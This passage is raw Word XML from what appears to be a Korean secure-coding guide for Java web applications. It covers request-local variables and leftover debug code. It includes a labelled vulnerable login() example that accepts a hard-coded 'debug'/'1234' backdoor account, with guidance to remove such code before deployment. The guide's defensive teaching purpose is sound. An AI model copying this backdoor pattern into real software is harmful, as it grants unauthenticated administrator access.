            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> → </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>요청마다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>독립된</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>스택</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>public class UserServlet extends HttpServlet {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    protected void doGet(HttpServletRequest req, ...) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        String currentUserId = req.getParameter("userId");  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>지역</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>변수</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>변수는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>요청</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>스레드에서만</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>사용됨</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    }</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>제거되지</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>않고</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>남은</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>디버그</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>코드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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>소프트웨어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배포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전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디버그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코드를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확인하고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반드시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삭제한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>디버깅용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계정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>백도어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>임시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비밀번호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등이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배포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코드에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포함되지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않도록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한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>디버그용</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>배포</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>버전에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>잔존</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>public boolean login(String id, String pw) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    if ("debug".equals(id) &amp;&amp; "1234".equals(pw)) return true;  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>디버그</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>백도어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>!</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    return userDao.checkPassword(id, pw);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>운영</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> debug/1234 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>백도어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>계정이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>존재하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>소스코드를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>열람한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>모든</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사람이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>관리자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인증</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시스템에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>접근할</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있습니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>내부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>개발자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>·</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외주</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인력</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>·</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>소스</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
